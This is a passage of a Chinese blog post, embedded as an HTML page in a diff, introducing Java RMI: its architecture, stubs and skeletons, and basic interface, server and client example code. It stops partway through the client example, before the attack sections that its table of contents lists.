@@ -1,0 +1,3003 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Java基础之RMI">
+<title>RMI</title>
+
+<link rel='canonical' href='https://fupanc-w1n.github.io/p/rmi/'>
+
+<link rel="stylesheet" href="/scss/style.min.45e3de8c0814070cbaa5e985ce54bc3660dbcbfa7077926b65bdd229ae300803.css"><meta property='og:title' content="RMI">
+<meta property='og:description' content="Java基础之RMI">
+<meta property='og:url' content='https://fupanc-w1n.github.io/p/rmi/'>
+<meta property='og:site_name' content='fupanc'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-09-25T22:54:06&#43;08:00'/><meta property='article:modified_time' content='2024-09-25T22:54:06&#43;08:00'/>
+<meta name="twitter:title" content="RMI">
+<meta name="twitter:description" content="Java基础之RMI">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/123_hu_e29e335f2b79de0d.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">fupanc</a></h1>
+            <h2 class="site-description">我与我周旋久，宁做我</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/fupanc-w1n'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#rmi架构">RMI架构</a></li>
+    <li><a href="#基本流程学习">基本流程学习</a>
+      <ol>
+        <li><a href="#调用对象如何定义">调用对象如何定义</a></li>
+        <li><a href="#如何调用">如何调用</a></li>
+        <li><a href="#其他特性说明">其他特性说明</a>
+          <ol>
+            <li><a href="#动态类加载">动态类加载</a></li>
+            <li><a href="#安全设置">安全设置</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#源码分析">源码分析</a>
+      <ol>
+        <li><a href="#服务注册">服务注册</a>
+          <ol>
+            <li><a href="#远程对象创建">远程对象创建</a></li>
+            <li><a href="#注册中心创建">注册中心创建</a></li>
+            <li><a href="#服务注册-1">服务注册</a></li>
+          </ol>
+        </li>
+        <li><a href="#服务发现">服务发现</a></li>
+        <li><a href="#服务调用">服务调用</a>
+          <ol>
+            <li><a href="#客户端">客户端</a></li>
+            <li><a href="#注册中心">注册中心</a></li>
+            <li><a href="#服务端">服务端</a></li>
+          </ol>
+        </li>
+        <li><a href="#总结">总结</a></li>
+        <li><a href="#dgc">DGC</a></li>
+      </ol>
+    </li>
+    <li><a href="#攻击-rmi">攻击 RMI</a>
+      <ol>
+        <li><a href="#攻击server端">攻击Server端</a>
+          <ol>
+            <li><a href="#恶意方法">恶意方法</a></li>
+            <li><a href="#恶意服务参数">恶意服务参数</a></li>
+            <li><a href="#动态类加载-1">动态类加载</a></li>
+            <li><a href="#替身攻击">替身攻击</a></li>
+          </ol>
+        </li>
+        <li><a href="#攻击注册中心">攻击注册中心</a>
+          <ol>
+            <li><a href="#bindrebind">bind/rebind</a></li>
+            <li><a href="#unbindlookup">unbind/lookup</a></li>
+          </ol>
+        </li>
+        <li><a href="#攻击client端">攻击Client端</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                Java安全
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/rmi/">RMI</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Java基础之RMI
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2024-09-25</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 8 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="rmi">RMI
+</h1><p>RMI全称是Remote Method Invocation，远程方法调用。这种思想其实是和C语言的RPC类似的。在这里的RMI是Java独有的一种机制，也就是可以<strong>让某个java虚拟机上的对象调用另一个java虚拟机中对象上的方法</strong>。</p>
+<p>具体思想就是让我们获取远程主机上对象的引用，我们调用这个引用对象，但实际方法的执行在远程服务端上。</p>
+<h2 id="rmi架构">RMI架构
+</h2><p>从RMI设计角度来讲，基本分为三层架构来实现RMI，分别为RMI服务端，RMI客户端和RMI注册中心。（但是其实服务端和注册中心是可以放在一起的）</p>
+<ul>
+<li>Client-客户端：客户端调用服务端的方法</li>
+<li>Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端方法执行的结果</li>
+<li>Registry-注册中心</li>
+</ul>
+<p><strong>Stub 和 Skeleton</strong>：</p>
+<p>RMI引入了两个概念，分别是Stubs（客户端存根）以及Skeletons（服务端骨架），当客户端（Client）试图调用一个远端的Object，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用服务端（Server）的目标类之前，也会经过一个对应的远端代理类，就是Skeleton，它从Stub中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeleton的调用对于 RMI服务的使用者来讲是隐藏的。</p>
+<p>时序图如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240906125826311.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240906125826311"
+	
+	
+></p>
+<p>还是比较清楚的。</p>
+<h2 id="基本流程学习">基本流程学习
+</h2><p>测试环境：</p>
+<ul>
+<li>JDK 8u411</li>
+</ul>
+<h3 id="调用对象如何定义">调用对象如何定义
+</h3><p>使用RMI，<strong>首先</strong>我们需要定义一个能够远程调用的接口，这个接口必须扩展<code>java.rmi.Remote</code>接口，用于表示可以从非本地虚拟机调用其方法，所以远程调用的对象必须实现这个接口。<strong>其次</strong>这个接口的所有方法都必须声明抛出<code>java.rmi.RemoteException</code>异常，如下实例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">Rmi.Server</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Remote</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.RemoteException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">RemoteInterface</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">sayHello</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">sayName</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>随后就可以来创建这个远程接口的实现类</strong>，这个类通常会扩展<code>java.rmi.server.UnicastRemoteObject</code>类，扩展此类后，<u>RMI会自动将这个类 输出（export） 给远程想要调用它的 Client 端（注册中心？）</u>。<strong>这里必须为这个实现类提供一个构造函数并且抛出 RemoteException</strong>。示例代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">Rmi.Server</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.RemoteException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RemoteTest</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">UnicastRemoteObject</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">RemoteInterface</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="nf">RemoteTest</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">sayHello</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;Hello welcome to use&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">sayName</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;hello&#34;</span><span class="o">+</span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果不让远程对象成为 UnicastRemoteObject 的子类，后面就需要自己手动使用UnicastRemoteObject的静态方法<code>exportObject</code>来手动 export 对象。</p>
+<h3 id="如何调用">如何调用
+</h3><p>前面就已经创建好了可以被远程调用的对象。如何调用呢。Java RMI 涉及了一个 Registry 的思想，也就是我们可以使用注册表来查找一个远端对象的引用。</p>
+<p>如何理解，可以将Registry理解为 RMI电话本，当我们想要在某个人那里获取信息时（Remote Method Invocation），我们在电话本上（Registry）通过这个人的名称（Name）来找到这个人的电话号码（Reference），并通过这个号码找到这个人（Remote Object）。</p>
+<p>这种电话本的思想，由<code>java.rmi.registry.Registry</code>和<code>java.rmi.Naming</code>来实现。现在分别来看一下这两个类的利用。</p>
+<ul>
+<li><strong>java.rmi.Naming</strong>：这是一个final类，提供了在远程对象注册表（Registry）中存储和获取远程对象引用的方法，这个类提供的每个方法都有一个 URL 格式的参数，格式如下：<code>//host:port/name</code>：
+<ol>
+<li>host 表示注册表所在的主机</li>
+<li>port表示注册表接收调用的端口号，默认为 1099</li>
+<li>name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键字。</li>
+</ol>
+</li>
+</ul>
+<p>Naming 提供了查询（lookup）、绑定（bind）、重新绑定（rebind）、解除绑定（unbind）、list（列表）用来对注册表进行操作。所以Naming类就是一个用来对注册表进行操作的类。而这些方法的具体实现，是调用<code>LocateRegistry.getRegistry</code>方法获取了Registry接口的实现类，并调用相关方法进行实现的。</p>
+<ul>
+<li><strong>java.rmi.registry.Registry</strong>：这个接口在RMI下有两个实现类，分别是RegistryImpl和RegistryImpl_Stub。后面再看。</li>
+</ul>
+<p>我们通常使用<code>LocateRegistry#createRegistry()</code>方法来创建注册中心，然后将待调用的类进行绑定：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">Rmi.Server</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Naming</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMIServer</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//创建注册中心</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Server start&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//绑定调用类</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">RemoteInterface</span><span class="w"> </span><span class="n">remoteTest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RemoteTest</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Naming</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;rmi://localhost:1099/Hello&#34;</span><span class="p">,</span><span class="n">remoteTest</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>客户端进行调用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">Rmi.Client</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//需要两端使用的RemoteInterface接口文件是同一个，或者打成jar包再使用。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">Rmi.Server.RemoteInterface</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Arrays</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Naming</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMIClient</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//获取注册表对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">getRegistry</span><span class="p">(</span><span class="s">&#34;localhost&#34;</span><span class="p">,</span><span class="n">1099</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Arrays</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="na">list</span><span class="p">()));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//寻找对应RMI实例</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RemoteInterface</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RemoteInterface</span><span class="p">)</span><span class="w"> </span><span class="n">Naming</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;Hello&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//调用远程对象的方法</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">o</span><span class="p">.</span><span class="na">sayHello</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">o</span><span class="p">.</span><span class="na">sayName</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ClientObject</span><span class="p">()));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
